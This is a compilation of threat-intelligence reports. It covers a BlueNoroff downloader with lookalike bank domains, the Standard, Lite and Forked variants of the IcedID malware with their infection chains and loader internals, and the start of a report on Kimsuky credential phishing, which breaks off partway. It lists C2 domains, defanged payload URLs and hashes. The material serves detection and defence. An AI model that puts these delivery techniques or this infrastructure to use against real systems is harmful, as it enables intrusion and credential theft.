This malware (MD5 087407551649376d90d1743bac75aac8) spawns a fake password file while fetching a remote payload and executing it.
Upon execution, it creates a fake file (wae.txt) to show a password composed of the string ‘password’ and fetches a payload from the embedded URL and loads it.
This scheme, showing a password via notepad.exe, is a trick favored by the BlueNoroff group to avoid arousing the victim’s suspicion.
Usually, the password contains the password needed to open the supplied encrypted decoy document. 
Simple downloader with fake password file It’s possible that the actor delivered the above Windows executable file in archive file format or disk image file format with an encrypted decoy document. 
Infrastructure While carrying out this research we found several C2 servers used by the actor.
All the servers are hosted by VPS vendors as usual and several of them were resolved to the same IP address.
The domain registration could be traced back to earlier in 2021, so this is an ongoing operation by the adversary. 
Domain IP ISP ASN offerings.cloud docs.azure-protection.cloud bankofamerica.us.org 104.168.174.80 Hostwinds LLC. 
AS54290 perseus.bond avid.lno-prima.lol 104.168.249.50 Hostwinds LLC. 
AS54290 offerings.cloud perseus.bond docs.azure-protection.cloud avid.lno-prima.lol 152.89.247.87 combahton GmbH AS30823 offerings.cloud 172.86.121.130 HIVELOCITY AS29802 www.capmarketreport.com 149.28.247.34 The Constant Company, LLC AS20473 ms.msteam.biz www.onlinecloud.cloud 155.138.159.45 The Constant Company, LLC AS20473 The actor usually used fake domains such as cloud hosting services for hosting malicious documents or payloads.
They also created fake domains disguised as legitimate companies in the financial industry and investment companies.
The domains, including pivoted domains, imitate venture capital names or big bank names.
Most of the companies are Japanese companies, indicating the actor has a keen interest in Japanese markets. 
Malicious domains Genuine company Category of business Country beyondnextventures.co cloud.beyondnextventures.co Beyond Next Ventures (https://beyondnextventures.com) Venture capital firm Japan smbc.ltd smbcgroup.us smbc-vc.com Sumitomo Mitsui Banking Corporation (https://www.smbc.co.jp) Japanese multinational banking and financial services Japan cloud.mufg.tokyo mufg.tokyo Mitsubishi UFJ Financial Group (https://www.mufg.jp) Bank in Japan Japan vote.anobaka.info ANOBAKA (https://anobaka.jp) Venture capital firm Japan it.zvc.capital Z Venture Capital (https://zvc.vc) Venture capital firm Japan abf-cap.co ABF Capital (https://www.abf-cap.com) 
Venture capital firm Japan angelbridge.capital Angel Bridge (https://www.angelbridge.jp) Venture capital firm Japan mizuhogroup.us careers.mizuhogroup.us Mizuho Financial Group (https://www.mizuhogroup.com) Banking holding company Japan bankofamerica.tel bankofamerica.nyc bankofamerica.us.org Bank of America (https://www.bankofamerica.com) Bank and financial services holding company USA tptf.us tptf.ltd ​​Trans-Pacific Technology Fund (https://tptf.co) Venture capital firm Taiwan Victims As we described in the section ‘Long-lasting initial infection’, we discovered that one victim in the UAE, probably a home financing company, was compromised by classic BlueNoroff group malware.
This financially motivated threat actor has been attacking various cryptocurrency-related businesses lately, but also other financial companies, as in this case. 
In addition, based on the domain naming and decoy documents, we assume, with low confidence, that the entities in Japan are on the radar of this group.
In one PowerPoint sample, we observed that the actor took advantage of a Japanese venture capital company.
Also, the samples we mentioned in the ‘Long-lasting initial infection’ section above were delivered to the victim with a Japanese file name, suggesting the target can read Japanese. 
Decoy document Conclusion According to a recent report, the BlueNoroff group stole cryptocurrency worth millions using their cyberattack capabilities.
It shows that this group has a strong financial motivation and actually succeeds in making profits from their cyberattacks.
As we can see from our latest finding, this notorious actor has introduced slight modifications to deliver their malware.
This also suggests that attacks by this group are unlikely to decrease in the near future. 
Indicators of compromise Downloader 087407551649376d90d1743bac75aac8 regsile.exe Cur1Agent downloader f766f97eb213d81bf15c02d4681c50a4 61a227bf4c5c1514f5cbd2f37d98ef5b 4c0fb06320d1b7ecf44ffd0442fc10ed d8f6290517c114e73e03ab30165098f6 Loader d3503e87df528ce3b07ca6d94d1ba9fc E:\Readme.exe 931d0969654af3f77fc1dab9e2bd66b1 Job_Description. 
exe Malicious Virtual Disk File a17e9fc78706431ffc8b3085380fe29f Job_Description.vhd Zip file and unzipped malicious shortcut 1e3df8ee796fc8a13731c6de1aed0818 新しいボーナススケジュール.zip (New bonus schedule) 21e9ddd5753363c9a1f36240f989d3a9 Password.txt.lnk URLs hxxp://avid.lno-prima[.]lol/VcIf1hLJopY/shU_pJgW2Y/KvSuUJYGoa/sX+Xk4Go/gGhI= hxxp://avid.lno-prima[.]lol/NafqhbXR7KC/rTVCtCpxPH/kMjTqFDDNt/fiOHK5H35B/bM%3D hxxp://offerings[.]cloud/NafqhbXR7KC/rTVCtCpxPH/pdQTpFN6FC/Lhr_wXGXix/nQ%3D hxxps://docs.azure-protection[.]cloud/EMPxSKTgrr3/2CKnoSNLFF/0d6rQrBEMv/gGFroIw5_m/n9hLXkEOy3/wyQ%3D%3D hxxps://docs.azure-protection[.]cloud/%2BgFJKOpVX/4vRuFIaGlI/D%2BOfpTtg/YTN0TU1BNx/bMA5aGuZZP/ODq7aFQ%3D/%3D hxxps://docs.azure-protection[.]cloud/+gFJKOpVX/4vRuFIaGlI/D+OfpTtg/YTN0TU1BNx/bMA5aGuZZP/ODq7aFQ%3D/%3D hxxps://bankofamerica.us[.]org/lsizTZCslJm/W+Ltv_Pa/qUi+KSaD/_rzNkkGuW6/cQHgsE= hxxps://www.capmarketreport[.]com/packageupd.msi?ccop=RoPbnVqYd Pivoted IP address 152.89.247.87 172.86.121.130 104.168.174.80 MITRE ATT&CK Mapping Tactic Technique Technique name Initial Access T1566.001 T1566.002 
Phishing: Spearphishing Attachment Phishing: Spearphishing Link Execution T1059.003 T1059.005 T1204.001 T1204.002 Command and Scripting Interpreter:
Windows Command Shell Command and Scripting Interpreter:
Visual Basic User Execution: Malicious Link User Execution: Malicious File Persistence T1547.008 Boot or Logon Autostart Execution: LSASS Driver Defense Evasion T1027.002 T1497.001 T1055.002 T1553.005 T1218.007 T1218.011 T1221 Obfuscated Files or Information: Software Packing Virtualization/Sandbox Evasion:
System Checks Process Injection: Portable Executable Injection Subvert Trust Controls: Mark-of-the-Web Bypass System Binary Proxy Execution: Msiexec System Binary Proxy Execution: Rundll32 Template Injection Command and Control T1071.001 Application Layer Protocol: Web Protocols Exfiltration T1041 Exfiltration over C2 Channel 
[1] APT Intel report: BlueNoroff Launched a New Campaign To Attack Cryptocurrency Business 
title: Fork in the Ice: The New Era of IcedID url: https://www.proofpoint.com/us/blog/threat-insight/fork-ice-new-era-icedid ​Key Findings Proofpoint is tracking new variants of IcedID used by at least three threat actors. 
Initial analysis suggests this is a forked version with potentially a separate panel for managing the malware. 
While much of the code base is the same, there are several key differences. 
One key difference is the removal of banking functionality such as web injects and backconnect. 
Proofpoint researchers hypothesize the original operators behind Emotet are using an IcedID variant with different functionality. 
Overview Proofpoint researchers have observed and documented, for the first time, three distinct variants of the malware known as IcedID.
Proofpoint calls the two new variants recently identified “Forked” and “Lite” IcedID.
This report details the following variants of IcedID: Standard IcedID Variant – The variant most commonly observed in the threat landscape and used by a variety of threat actors. 
Lite IcedID Variant – New variant observed as a follow-on payload in November Emotet infections that does not exfiltrate host data in the loader checkin and a bot with minimal functionality. 
Forked IcedID Variant – New variant observed by Proofpoint researchers in February 2023 used by a small number of threat actors which also delivers the bot with minimal functionality. 
IcedID is a malware originally classified as a banking malware and was first observed in 2017.
It also acts as a loader for other malware, including ransomware. 
As previously published, historically there has been just one version of IcedID that has remained constant since 2017.
The well-known IcedID version consists of an initial loader which contacts a Loader C2 server, downloads the standard DLL Loader, which then delivers the standard IcedID Bot. 
In November 2022, Proofpoint researchers observed the first new variant of IcedID Proofpoint dubbed “IcedID Lite” distributed as a follow-on payload in a TA542 Emotet campaign.
It was dropped by the Emotet malware soon after the actor returned to the e-crime landscape after a nearly four-month break. 
The IcedID Lite Loader observed in November 2022 contains a static URL to download a “Bot Pack” file with a static name (botpack.dat) which results in the IcedID Lite DLL Loader, and then delivers the Forked version of IcedID Bot, leaving out the webinjects and backconnect functionality that would typically be used for banking fraud. 
Starting in February 2023, Proofpoint observed the new Forked variant of IcedID.
To date, Proofpoint has uncovered seven campaigns using the Forked IcedID variant.
This variant was distributed by TA581 and one unattributed threat activity cluster which acted as initial access facilitators.
The campaigns used a variety of email attachments such as Microsoft OneNote attachments and somewhat rare to see .URL
attachments, which led to the Forked variant of IcedID. 
The IcedID Forked Loader, first observed in February 2023, is more similar to the Standard IcedID Loader in that it contacts a Loader C2 server to retrieve the DLL loader and bot.
That DLL loader has similar artifacts to the Lite Loader, and also loads the Forked IcedID Bot. 
The following picture shows the high-level overview of the various IcedID variants Proofpoint researchers have identified. 
Figure 1: Overview of the three IcedID variants. 
Threat Actor Details Proofpoint has identified hundreds of IcedID campaigns from 2022 through 2023, and at least five threat actors were observed directly distributing this malware in campaigns since 2022.
Nearly all threat actors and unattributed threat activity clusters use the Standard IcedID variant.
Proofpoint considers most of these threat actors to be initial access brokers that facilitate infections leading to ransomware. 
Proofpoint continues to see all variants of the IcedID malware in campaign data, so researchers assess with high confidence that the changes detailed below are not direct upgrades to the Standard IcedID codebase.
It is likely a cluster of threat actors is using modified variants to pivot the malware away from typical banking trojan and banking fraud activity to focus on payload delivery, which likely includes prioritizing ransomware delivery.
Additionally, based on artifacts observed in the codebase, timing and association with Emotet infections, Proofpoint researchers suspect the initial developers of Emotet have partnered with IcedID operators to expand their activities including using the new Lite variant of IcedID that has different, unique functionality and likely testing it via existing Emotet infections. 
The Lite IcedID variant has only been observed following TA542 Emotet infections, but Proofpoint cannot definitively attribute the Lite variant to TA542 as follow-on infections are typically outside of researchers’ visibility.
The following are threat actors frequently associated with IcedID. TA578 – Proofpoint has observed TA578 deliver IcedID in campaigns since June 2020.
Typically, this actor uses email themes such as “stolen images” or “copyright violation” to deliver malware.
In addition to IcedID, TA578 also frequently conducts campaigns delivering Bumblebee malware.
TA578 uses the Standard IcedID variant. 
TA551 – Proofpoint has observed TA551 deliver IcedID in campaigns since November 2018.
This actor usually uses thread hijacking to typically deliver attached files including Word documents, PDFs, and recently, OneNote documents.
TA551 has used multiple malware types, with recent payloads including IcedID, SVCReady, and Ursnif.
TA551 uses the Standard IcedID variant. 
TA577 – Proofpoint has observed TA577 use IcedID in limited campaigns since February 2021.
This actor typically uses thread hijacking to deliver malware, with Qbot being TA577’s preferred payload.
However, Proofpoint has observed IcedID delivered by TA577 in six campaigns since 2022.
TA577 uses the Standard IcedID variant. 
TA544 – Proofpoint observed TA544 use IcedID in limited campaigns throughout 2022.
This actor typically targets organizations in Italy and Japan, and typically delivers Ursnif malware.
TA544 uses the Standard IcedID variant. 
TA581 – TA581 is a newly classified threat actor Proofpoint has tracked as an unattributed activity cluster since mid-2022.
This actor typically uses business-relevant themes such as payroll, customer information, invoice, and order receipts to deliver a variety of filetypes or URLs.
TA581 typically delivers IcedID, but has been observed using Bumblebee malware and telephone-oriented attack delivery (TOAD) payloads.
TA581 uses the Forked IcedID variant. 
Campaign Details Proofpoint has only observed the IcedID Lite Loader variant delivered as a second-stage payload following Emotet infections associated with November 2022 campaigns.
Below are examples of the Standard and Forked IcedID variants observed as first-stage payloads. 
Example 1: IcedID Standard Campaign Proofpoint observed a campaign with over 2,800 messages on 10 March 2023.
This campaign began with thread hijacked emails which contained HTML attachments.
The HTML attachments used HTML Smuggling to drop a password protected, zipped Windows Script File (WSF).
The password “747” was displayed in the HTML file.
The WSF ran a VBScript which initiated a PowerShell command to download and execute an intermediate script which then downloaded and executed the Standard IcedID Loader using a non-standard export “init”. 
Figure 2: Sample email using thread hijacking to deliver an HTML attachment. 
Figure 3: 
HTML Attachment spoofing Office 365. Figure 4: Contents of smuggled ZIP file. 
Figure 5: WSF file contents. 
Figure 6: Intermediate PowerShell downloader.
This pulled the next stage – the Standard IcedID Loader. 
The IcedID loader connected to the C2 server and delivered and executed the IcedID core bot if specific conditions were met. 
Standard IcedID Loader Configuration: C2:
ariopolanetyoa[.]com ProjectID: 3278418257 Standard IcedID Bot Configuration: C2:
alishaskainz[.]com C2: akermonixalif[.]com CommsCookie: 998075300 ProjectID: 35 URI: /news/ 
Update URLs: [ “hxxps://yelsopotre[.]com/news/, ”hxxps://qoipaboni[.]com/news/", hxxps://halicopnow[.]com/news/, hxxps://oilbookongestate[.]com/news/ ] Example 2: IcedID Forked Campaign Proofpoint observed a campaign with over 13,000 messages on 3 February 2023.
This campaign began with invoice-themed email lures requesting confirmation from the recipient to manage a contract.
The emails were personalized to the recipient by using the recipient’s name in the greeting of the email.
The observed emails contained the subject "How can i contact you?" with an attachment name (regex): "unpaid_[0-9]{4}-February-03\.one". 
These messages contained Microsoft OneNote attachments (.one).
When opened, the OneNote document instructed the recipient to "open" the document by double-clicking the button displayed in the OneNote document.
An HTML Application (HTA) file was concealed beneath the "open" text which, if clicked, executed the HTA file.
The HTA file initiated a PowerShell command used to download and execute an IcedID loader.
The IcedID loader was executed with rundll32 using a non-standard export: "PluginInit".
The PowerShell command also downloaded and opened a decoy PDF. 
Figure 7: Screenshot of email sample from the 3 February IcedID campaign. 
Figure 8: OneNote attachment containing the “open” button that hides the HTA file. 
Figure 9: Screenshot of HTA displayed in a text editor. 
Figure 10: Benign PDF that appears while malicious activity is running in the background. 
The IcedID loader connected to the C2 server and delivered and executed the IcedID core bot if specific conditions were met. IcedID Loader Configuration: C2: ehonlionetodo[.]com ProjectID: 3954321778 IcedID Bot configuration: { "date": "03-06-2023", "family": "IcedID Core", "comms_cookie": "01", "project_id": 3954321778, "uri": "/news/", "c2s": [ "renomesolar[.]com", "palasedelareforma[.]com", "noosaerty[.]com" ] This campaign is attributed to TA581, a threat actor that Proofpoint has been tracking since 2022, and officially designated a TA number in March 2023. 
Example 3: IcedID Forked Campaign Proofpoint observed a campaign with over 200 messages conducted from 20 February to 23 February 2023.
This campaign included two different email lures: 1) a recall notice purporting to be from the National Traffic and Motor Vehicle Safety Act; and 2) a violation purporting to be from the U.S. Food and Drug Administration (FDA).
The emails contained .URL
attachments. 
A URL file is a shortcut that points to a specific Uniform Resource Locator. 
If the recipient clicked to open the .URL file, the recipient's default web browser would access the URL contained in the file.
If the .URL file was opened it would initiate the download of a batch (.bat) file.
The batch file would download and execute an IcedID loader with rundll32 using a non-standard export: "PluginInit". 
Figure 11: Sample email using the motor vehicle safety lure. 
Figure 12: Sample email using motor vehicle/seatbelt safety lure. 
Figure 13: URL (.url) attachment displayed in a text editor. 
Figure 14: BAT (.bat) file displayed in a text editor. 
The IcedID loader connected to the C2 server and delivered and executed the IcedID core bot if specific conditions were met. IcedID Loader Configuration: C2:
samoloangu[.]com project ID: 3971099397 IcedID Bot Configuration: 
C2: sanoradesert[.]com C2: steepenmount[.]com C2:
guidassembler[.]com CommsCookie: 1 ProjectID: 3971099397 URI: /news/ ] Malware analysis Before comparing the Standard Loader to the Forked Loader, it is worth covering the highlights of the IcedID Lite Loader as there is code overlap and clear similarities when compared with the Forked Loader.
For an in-depth analysis of the Lite Loader, check out Proofpoint’s previous report here.
The Lite Loader’s purpose is to download the next stage of the malware from a hardcoded domain and URI path.
The domain is decrypted from the configuration and the URI path is decrypted within the function that makes the HTTP request.
Unlike the Standard IcedID Loader, there is no host information being exfiltrated within the request.
When the Lite Loader was dropped on Emotet infections, that fact made sense, since this version of IcedID was specifically being deployed on already infected machines, and there was no need to check the host information. 
Figure 15: Config decryption within IcedID Lite Loader. 
Figure 16: Decryption of the URI within the IcedID Lite Loader. 
Considering that Proofpoint has not observed a standalone campaign of the Lite Loader in the wild, the remainder of the analysis section will compare the Standard variant to the Forked variant as well as similarities to the Lite Loader. 
Loader Analysis Field Standard Loader Forked Loader Internal name loader_dll_64.dll Loader.dll FileType Standard DLL COM Server Extraneous string Contains “1.bin” Project ID Project ID differs from loader to bot Project ID is the same across loader and bot Rough size ~36KB ~48KB Botpack decryption Decryption is the same across both As far as behavior is concerned, the Forked Loader functions the same as the Standard Loader.
The goal is to send host info to the loader C2, then to gate the bot download.
This gating mechanism is to ensure that only truly infected machines get the bot binary vs researchers or malware sandboxes.
If the checks are passed, the C2 will return the encrypted bot and DLL loader which is where the real capabilities of the botnet emerge.
The differences come within the binary itself by how the code is/was structured and how they obfuscate the sample.
Both variants of the loader initiate their malicious code by creating a thread for the malware main.
Before this happens though, the Forked Loader decrypts and copies strings into global variables where they will be later used to resolve required functions.
This pattern of decrypting strings for future use will come up later in the analysis of the DLL loader. 
Figure 17: String decryption of the DLL names used within the Forked Loader. 
With the DLL strings decrypted, the malware then decrypts the loader configuration by taking the first 64 bytes and XORing it against the next 64 bytes.
The first four bytes of the decrypted buffer will contain the project identifier (ID) (a campaign identifier of sorts) and then a singular domain which is used to gate the download of the bot. Figure 18: Decryption of the config buffer in the Forked Loader. 
For whatever reason, there is an extraneous “1.bin” that is appended to a string which isn’t used.
As far as Proofpoint researchers can tell, this string is not used and serves no purpose.
With the config decrypted, the malware creates the cookies that contain the host information and sends an HTTP request that will contain the encrypted bot response. 
Figure 19: Raw response from the loader C2 containing the encrypted bot and DLL loader. 
The response gets decrypted with the IcedID decryption routine, then split into the encrypted bot (being “license.dat”) and the custom DLL loader which is generally some randomly generated filename ending in .tmp. 
DLL Loader Analysis Field Standard DLL Loader Forked DLL Loader Extraneous code Contains code to decrypt strings and domains related to the “lite loader” File type Standard DLL COM Server Internal name init_dll_64.dll Init.dll Rough size 20KB 36KB The start of the DLL loader is the same across both versions of the DLL loader, a thread is created that contains the malicious code for custom loading license.dat: Figure 20: Start of the Standard DLL Loader. 
When comparing the StartAddress function, we see the biggest difference across these two samples: Figure 21: Standard DLL Loader thread function. 
The following shows the thread function for the Forked DLL Loader.
This function decrypts strings that originally just existed in the Lite Loader. Figure 22:
Forked DLL Loader thread function. 
The rest of this report section focuses on the Forked DLL Loader, as that is where these differences exist.
Just like the Forked Loader, the Forked DLL Loader decrypts the DLL strings to be used later to resolve handles to the DLLs needed.
The strings are decrypted in the same algorithm where the data is split into DWORDs and XOR’d against a random key. 
Figure 23: String decryption for the DLL names needed for execution. 
Next, a function is called that decrypts strings that are not used at any point within the binary itself.
The function starts by creating a structure that is going to be returned at the end of the function.
This structure contains two domains and various URIs that could potentially be used to get a separate version of the bot. Figure 24: Decryption of “Lite Loader”" domains. 
For all the Forked DLL Loader variants we have seen, there are two domains that are decrypted: “tourdeworldsport[.]com” and “handsinworld[.]com”.
Neither of these domains are used within the file, and at the time of this report have no relations on VirusTotal.
Looking into the “handsinworld” domain, passive DNS shows that the domain started resolving to its current IP of “193[.]37[.]69[.]107” on 12 Nov 2022.
This is also around the time that Emotet dropped the IcedID Lite Loader onto the Epoch 4 and Epoch 5 botnet.
More information on the Lite Loader and Emotet can be found in our previous report here.
The other domain “tourdeworldsport”, also started resolving to the IP “5[.]61[.]34[.]46” on 18 Nov 2022. 
With the domain names decrypted, the DLL Loader decrypts 10 strings that should be URIs to be appended to the domains. 
Figure 25: Decryption of “Lite Loader” filenames. 
Within this list though, they have typos for botpackn3dat.
Most likely there should be a period before .dat.
This is the same URI structure (/botpack.dat) that the Lite Loader used to download the bot and DLL loader from the C2 in November 2022 when it was dropped via Emotet infections. 
After the strings are decrypted, the structure referencing them is never used again.
This is most likely code that has been copy/pasted from the lite loader.
If implemented correctly, these strings should appear in the actual loader of IcedID and not within the DLL Loader where it currently resides.
These commonalities between the Lite Loader and this DLL Loader make it seem as if the same group that dropped IcedID via Emotet is behind these campaigns as well. 
Bot Analysis Field Standard Bot Forked Bot File format Custom PE Format Custom PE Format Rough size 368 KB 304 KB Removed code Removed web injects capability Versioning Currently at version 119 Currently at version 111 Looking at the Forked IcedID Bot variant and the Standard Bot variant in BinDiff, researchers observed that the Standard IcedID bot contains more functionality than the Forked variant. 
Figure 26: Output of BinDiff showing the Standard Bot vs the Forked Bot. 
Combining Hexray’s Lumina and BinDiff shows that the Standard Bot contains functionality relating to web injects, adversary in the middle (AiTM) and backconnect capabilities that do not exist within the Forked variant.
This could be because banking fraud has become increasingly more difficult over the last couple of years. 
Figure 27: Functions that have been removed within the Forked Bot. 
Within the communications of the bot, there is an authentication header which contains the bot’s project ID, some other details and the version of the bot. 
Authorization: Basic OTk4MDc1MzAwOjA6MTE5OjY1OjM1 998075300:0:119:65:35 Base64 decoding this value gives up the version as the third component of the list.
For the Standard IcedID Bot, this value is set to 119 as seen above, but for the Forked variant, we get the following base64 decoded header; 998075300:0:111:67:1 
This value contains version 111, which could indicate the fork happened when the Standard Bot was using that version. 
Finally, there seems to be a bug within the Forked variant of the bot where the URIs of specific requests are not constructed properly which causes 404s to occur. 
Figure 28: Network requests made by the Forked Bot. 
In the example above, the request should be “/news/4/2/1” but for whatever reason the bot does not append the initial / for specific commands. 
Lite Loader Anomaly 
After analysis of the separate variants was finished, Proofpoint identified a file called “botpackn1.dat” on VirusTotal that seemed related to our Lite Loader. 
Figure 29: VirusTotal page showing the botpack used in the Lite Loader. 
That filename is embedded within the custom Forked DLL Loader mentioned previously.
This relationship was enough to prompt further analysis.
In the article where Proofpoint described the IcedID Lite Loader being dropped via Emotet infections, researchers documented the structure of the botpack format and how to decrypt it as well.
Taking that same script and applying it to this file leads to a valid configuration where researchers can analyze the configuration. 
Figure 30: Commandline output showing the decrypted botpack structure. 
This botpackn1.dat contains the later stages of the infection chain, so with some pivoting on the VirusTotal relationships, researchers land on the distribution URL (VT Link) “http[:]//lepriconloots[.]com/botpackn1.dat”.
Pivoting again to find files that reach to the URL, we come across the Lite Loader sample itself.
Looking at the build artifacts of this sample, it seems like the threat actors have removed the PDB path, but the Lite Loader still contains the build name “Loader.dll”.
Loader.dll was initially used within IcedID to refer to the Lite Loader back when it was dropped via Emotet infections in November, but that same build name is now being used within the Forked DLL Loader.
This could mean the codebase is similar enough where the threat actors can interchange the loader and the DLL Loader, or that these actors are copy/pasting extraneous code. 
Figure 31: Embedded build name of the DLL Loader. 
Finally, pivoting on where this “c2.dll” (IcedID Lite loader) came from, the distribution URL “http[:]//104[.]156[.]149[.]6/webdav/c2.dll” is observed.
Similarly, this IP address hosted an IcedID campaign from TA581 that occurred on 21 February 2023.
The TA581 campaign ended up loading the DLL “host.dll” from that same directory and led to one of the first campaigns of Proofpoint observing the Forked variant.
At the time when this distribution URL was live the IP was hosting an open directory on /webdav/ that contained various bat files, a forked IcedID loader as well as this lite loader. 
Conclusion IcedID is a popular malware typically used by more advanced cyber criminal threat actors, and its use across the threat landscape has remained relatively consistent until recently.
Ultimately, there seems to be considerable effort going into the future of IcedID and the malware’s codebase, including the addition of two new variants described in this report.
While historically IcedID’s main function was a banking trojan, the removal of banking functionality aligns with the overall landscape shift away from banking malware and an increasing focus on being a loader for follow-on infections, including ransomware. 
Proofpoint anticipates that while many threat actors will continue to use the Standard variant, it is likely the new variants will continue to be used to facilitate additional malware attacks. 
ET Rules ET MALWARE Win32/IcedID Request Cookie ETPRO MALWARE Win32/IcedID Stage2 Checkin ETPRO MALWARE Win32/IcedID Stage2 CnC Activity ETPRO MALWARE Win32/IcedID Stage2 CnC Activity M2 (GET) Indicators of Compromise Indicator Type Description Date Observed ehonlionetodo[.]com C2 IcedID Loader February 2023 samoloangu[.]com C2 IcedID Loader February 20-23, 2023 sanoradesert[.]com C2 IcedID Bot February 20-23, 2023 steepenmount[.]com C2 IcedID Bot February 20-23, 2023 guidassembler[.]com C2 IcedID Bot February 20-23, 2023 renomesolar[.]com C2 IcedID Bot February 3, 2023 palasedelareforma[.]com C2 IcedID Bot February 3, 2023 noosaerty[.]com C2 IcedID Bot February 3, 2023 hxxp[://]helthbrotthersg[.]com/view[.]png URL HTA Payload URL February 3, 2023 hxxp[://]104[.]156[.]149[.]6/webdav/c2[.]dll URL Staging URL for Lite Loader February 22, 2023 hxxp[://]lepriconloots[.]com/botpackn1[.]dat URL Staging URL for the IcedID bot February 22, 2023 hxxp[://]94[.]131[.]11[.]141/webdav/Labels_FDA_toCheck[.]bat URL .URL
File Payload URL February 20-23, 2023 hxxp[://]94[.]131[.]11[.]141/webdav/fda[.]dll URL BAT Payload URL February 20-23, 2023 Recall_2.22.url filename .URL
Attachment February 20-23, 2023 feb20_fda_labels-violation.url filename .URL
Attachment February 20-23, 2023 dc51b5dff617f4da2457303140ff1225afc096e128e7d89454c3fa9a6883585c SHA256 .URL
Attachment February 20-23, 2023 7c8b3b8cf2b721568b96f58e5994b8ddb8990cd05001be08631ade7902ae6262 SHA256 Botpackn1.dat February 22, 2023 fbad60002286599ca06d0ecb3624740efbf13ee5fda545341b3e0bf4d5348cfe SHA256 IcedID Standard Loader February 3, 2023 03fdf03c8f0a0768940c793496346253b7ccfb7f92028d3281b6fc75c4f1558e SHA256 HTA February 3, 2023 9bf40256fb7f0acac020995a3e9a231d54a6b14bb421736734b5815de0d3ba53 SHA256 WSF March 10, 2023 befeb1ab986fae9a54d4761d072bf50fdbff5c6b1b89b66a6790a3f0bfc4243f SHA256 DLL March 10, 2023 hxxp[://]segurda[.]top/dll/loader_p1_dll_64_n1_x64_inf[.]dll53[.]dll URL Staging URL for Standard Loader March 10, 2023 hxxp[://]segurda[.]top/gatef[.]php URL PowerShell Payload URL March 10, 2023 consumption_8581_march-10.html Filename HTML Attachment March 10, 2023 
title: Kimsuky Strikes Again | New Social Engineering Campaign Aims to Steal Credentials and Gather Strategic Intelligence url: https://www.sentinelone.com/labs/kimsuky-new-social-engineering-campaign-aims-to-steal-credentials-and-gather-strategic-intelligence/ Executive Summary SentinelLabs has been tracking a social engineering campaign by the North Korean APT group Kimsuky targeting experts in North Korean affairs, part of a broader campaign discussed in a recent NSA advisory. 
The campaign has the objective of stealing Google and subscription credentials of a reputable news and analysis service focusing on North Korea, as well as delivering reconnaissance malware. 
Kimsuky engages in extensive email correspondence and uses spoofed URLs, websites imitating legitimate web platforms, and Office documents weaponized with the ReconShark malware. 
This activity indicates Kimsuky’s growing dedication to social engineering and highlights the group’s increasing interest in gathering strategic intelligence. 
Overview 
In collaboration with NK News, a leading subscription-based service that provides news and analyses about North Korea, SentinelLabs has been tracking a targeted social engineering campaign against experts in North Korean affairs from the non-government sector.
The campaign focuses on theft of email credentials, delivery of reconnaissance malware, and theft of NK News subscription credentials.
Based on the used malware, infrastructure, and tactics, we assess with high confidence that the campaign has been orchestrated by the Kimsuky threat actor. 
The social engineering tactics and some infrastructure characteristics closely relate to a Kimsuky activity privately reported by PwC and discussed in an NSA advisory published during the writing of this article.
We focus on the specific targeting of expert analysts of North Korean affairs by impersonating NK News and stealing NK News credentials, and provide details on used TTPs to support collaborative hunting and detection efforts. 
Kimsuky, a suspected North Korean advanced persistent threat (APT) group whose activities align with the interests of the North Korean government, is known for its global targeting of organizations and individuals.
Operating since at least 2012, the group often employs targeted phishing and social engineering tactics to gather intelligence and access sensitive information. 
A hallmark of the activity we discuss in this post is Kimsuky’s focus on establishing initial contact and developing a rapport with their targets prior to initiating malicious activities.
As part of their initial contact strategy, the group impersonated Chad O’Carroll, the founder of NK News and the associated holding company Korea Risk Group, using an attacker-created domain, nknews[.]pro, which closely resembles the legitimate NK News domain nknews.org.
The initial email requests the review of a draft article analyzing the nuclear threat posed by North Korea. 
If the target engages in the conversation, Kimsuky uses the opportunity to deliver a spoofed URL to a Google document, which redirects to a malicious website specifically crafted to capture Google credentials.
Kimsuky may also deliver a weaponized Office document that executes the ReconShark reconnaissance malware. 
Further, Kimsuky’s objective extends to the theft of subscription credentials from NK News.
To achieve this, the group distributes emails that lure targeted individuals to log in on the malicious website nknews[.]pro, which masquerades as the authentic NK News site.
The login form that is presented to the target is designed to capture entered credentials. 
This Kimsuky activity indicates the group’s growing efforts to establish early communication and foster trust with their targets prior to initiating malicious operations, including the delivery of malware.
Their approach highlights the group’s commitment to creating a sense of rapport with the individuals they target, potentially increasing the success rate of their subsequent malicious activities. 
By actively targeting high-profile experts in North Korean affairs and stealing subscription credentials from prominent news and analysis outlets focussing on North Korea, Kimsuky demonstrates a heightened curiosity in understanding how the international community perceives developments concerning North Korea, such as the country’s military activities.
These actions are probably part of their broader objective to gather strategic intelligence, contributing to North Korea’s decision-making processes. 
Google Credential Theft We observed Kimsuky distributing an HTML-formatted phishing email to selected individuals, which requests the review of a draft article analyzing the nuclear threat posed by North Korea.
The email primarily aims to initiate a subsequent conversation and is intentionally designed to appear benign: It impersonates NK News leadership and lacks any malicious artifacts. 
Initial email If the target engages in the conversation, Kimsuky eventually follows up with an email that contains an URL to a Google document. 
Follow-up email If the target is not responsive, Kimsuky follows up with a reminder email in an attempt to engage the target in conversation. 
Reminder email The URL’s destination is manipulated through the spoofing technique of setting the href HTML property to direct to a website created by Kimsuky.
This method, commonly employed in phishing attacks, creates a discrepancy between the perceived legitimacy of the link (a genuine Google document) and the actual website visited upon clicking the URL. 
The displayed URL to a Google document points to an actual article hosted on Google Docs, delving into the topic of the North Korean nuclear threat.
The article contains visible edits to give the impression of a genuine draft article, aligning with Kimsuky’s luring tactic. 
Google document The spoofed destination of the URL redirects the target to an attacker-created website that masquerades as a legitimate Google Docs site for requesting document access, such as https[://]drive-google[.]shanumedia[.]com/pdf/ul/ji78fghJHKtgfLKJIO/s2.php?menu=ZGFu[...]vbQ== The Base-64 encoded segment, that is, the value of the menu URL query parameter, resolves to the target’s email address. 
This serves as a means of transporting the target’s address to the fake Google Docs site, which enables the site to dynamically display the address, creating a personalized and convincing appearance of legitimacy.
The design and functionality of this site suggest its potential for reuse in targeting different individuals. 
Malicious Google Docs site We were unable to analyze the functionality behind the Request access web element as the group has taken down the site.
However, given the theme of the site, we suspect that it has been designed to capture entered Google credentials. 
During conversations with targeted individuals, Kimsuky also seizes any available opportunity to distribute password-protected weaponized Office documents that deploy the ReconShark reconnaissance malware.
ReconShark exfiltrates information relevant for conducting subsequent precision attacks, such as deployed detection mechanisms and hardware information.
The implementation of the ReconShark variant we observed in this activity remains the same as the one covered in our previous post on Kimsuky activity, with the main distinction being the use of a different C2 server: staradvertiser[.]store.
This domain resolves to the IP address 162.0.209[.]27, which has hosted domains that have been attributed to Kimsuky in previous research, such as sesorin[.]lol and rfa[.]ink.
